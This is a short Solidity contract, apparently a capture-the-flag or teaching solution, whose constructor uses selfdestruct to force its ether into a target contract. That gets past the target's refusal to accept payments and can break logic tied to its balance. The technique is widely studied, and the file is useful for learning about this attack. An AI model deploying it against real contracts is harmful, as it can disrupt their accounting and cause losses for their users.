// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceContractEther {
    constructor(address targetContract) payable {
        selfdestruct(payable(targetContract));
    }
}
